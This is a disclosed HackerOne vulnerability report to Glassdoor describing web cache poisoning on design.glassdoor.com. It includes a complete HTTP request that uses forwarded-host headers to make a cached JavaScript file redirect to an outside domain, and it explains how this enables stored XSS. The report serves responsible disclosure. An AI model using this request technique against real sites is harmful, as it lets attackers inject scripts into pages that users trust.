# Cache Poisoning allows redirection on JS files

## Report Details
- **Report ID**: 1795197
- **URL**: https://hackerone.com/reports/1795197
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-12-07T00:38:47.764Z
- **Disclosed**: 2023-08-24T14:26:15.282Z

## Reporter
- **Username**: youstin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: glassdoor

## Vulnerability Information
Hi,

I found the following Cache Poisoning vulnerability:

1. Send the following request: ( this will poison `/test.js` into redirecting to `https://youst.in/test.js`) 

```http
GET /test.js?cb=1 HTTP/2
Host: design.glassdoor.com
Sec-Ch-Ua: "Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: text/css,*/*;q=0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: style
Referer: https://design.glassdoor.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
X-Forwarded-Scheme:  http
X-Forwarded-Host: youst.in

```

2. You should notice the `Cf-Cache-Status: MISS` header when first sending the request. After sending another request, you should see `Cf-Cache-Status: HIT`, confirming the redirect has been cached.

3. You can also visit the url in a browser and notice you get redirect to `youst.in`.

## Impact

An attacker can use the same attack against valid JS files leading to full control over the loaded JS. If any Glassdoor websites import javascript files from `https://design.glassdoor.com/*` they are susceptible to a Stored XSS attack via Cache Poisoning.

## Attachments
No attachments
